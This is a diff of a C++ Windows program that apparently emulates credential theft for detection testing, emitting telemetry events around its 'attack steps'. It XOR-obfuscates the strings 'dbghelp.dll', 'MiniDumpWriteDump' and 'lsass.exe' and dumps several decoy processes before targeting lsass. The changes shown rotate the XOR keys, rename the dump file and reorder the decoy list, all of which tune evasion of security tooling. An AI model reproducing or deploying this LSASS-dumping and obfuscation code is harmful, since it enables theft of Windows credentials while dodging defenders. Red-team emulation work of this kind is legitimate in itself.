@@ -19,7 +19,7 @@ TRACELOGGING_DEFINE_PROVIDER(
     (0x72248466, 0x7166, 0x4feb, 0xa3, 0x86, 0x34, 0xd8, 0xf3, 0x5b, 0xb6, 0x37)  // a random GUID
 );
 
-int sleep_between_steps_ms = 970; // time to wait between attack steps
+int sleep_between_steps_ms = 980; // time to wait between attack steps
 
 UINT64 get_ns_time() {
     auto now = std::chrono::system_clock::now();
@@ -147,23 +147,23 @@ int main(int argc, char** argv) {
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
-    BYTE outFileBytes[] = { 0x02,0x78,0x1d,0x17,0x32,0x27,0x33,0x31,0x1d,0x12,0x34,0x20,0x2d,0x2b,0x22,0x1e,0x05,0x2d,0x36,0x2c,0x2d,0x2d,0x20,0x26,0x32,0x1e,0x35,0x27,0x32,0x36,0x6f,0x26,0x2c,0x32,0x41 };
+    BYTE outFileBytes[] = { 0x02,0x78,0x1d,0x17,0x32,0x27,0x33,0x31,0x1d,0x12,0x34,0x20,0x2d,0x2b,0x22,0x1e,0x05,0x2d,0x36,0x2c,0x2d,0x2d,0x20,0x26,0x32,0x1e,0x2d,0x6c,0x25,0x2f,0x31,0x42 };
     for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
 
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
-    BYTE dumpLibraryBytes[] = { 0x25,0x20,0x26,0x2a,0x24,0x2e,0x31,0x6c,0x25,0x2e,0x2d,0x42 };
-    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+    BYTE dumpLibraryBytes[] = { 0x27,0x26,0x24,0x2c,0x26,0x28,0x33,0x6a,0x27,0x28,0x2f };
+    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
 
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
-    BYTE dumpFunctionBytes[] = { 0x0c,0x2b,0x2f,0x2b,0x05,0x37,0x2c,0x32,0x16,0x30,0x28,0x36,0x24,0x06,0x34,0x2f,0x31,0x42 };
-    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+    BYTE dumpFunctionBytes[] = { 0x0e,0x2d,0x2d,0x2d,0x07,0x31,0x2e,0x34,0x14,0x36,0x2a,0x30,0x26,0x00,0x36,0x29,0x33,0x44 };
+    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
 
     msg << "After decrypting strings";
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
     Sleep(sleep_between_steps_ms);
 #else
     // literal strings -> already \0 terminated
-    BYTE outFileBytes[] = "C:\\Users\\Public\\Downloads\\test.dmp"; 
+    BYTE outFileBytes[] = "C:\\Users\\Public\\Downloads\\l.dmp"; 
     BYTE dumpLibraryBytes[] = "dbghelp.dll";
     BYTE dumpFunctionBytes[] = "MiniDumpWriteDump";
 #endif
@@ -216,7 +216,7 @@ int main(int argc, char** argv) {
 
     constexpr int dumps = 20;
     std::vector<std::wstring> procsDump = {
-        L"explorer.exe", L"powershell.exe", L"cmd.exe", L"ShellHost.exe", L"audiodg.exe"
+        L"audiodg.exe", L"explorer.exe", L"cftmon.exe", L"StartMenuExperienceHost.exe"
     };
     int i = 0;
     while (i < dumps) { // repeat until target number reached
@@ -260,8 +260,8 @@ int main(int argc, char** argv) {
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
     // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
-    BYTE procBytes[] = { 0x2d,0x42,0x32,0x42,0x20,0x42,0x32,0x42,0x32,0x42,0x6f,0x42,0x24,0x42,0x39,0x42,0x24,0x42,0x41,0x42 };
-    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+    BYTE procBytes[] = { 0x2f,0x44,0x30,0x44,0x22,0x44,0x30,0x44,0x30,0x44,0x6d,0x44,0x26,0x44,0x3b,0x44,0x26,0x44,0x43,0x44 };
+    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x43 : 0x44); }
 
     msg << "After decrypting target proc string";
     print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
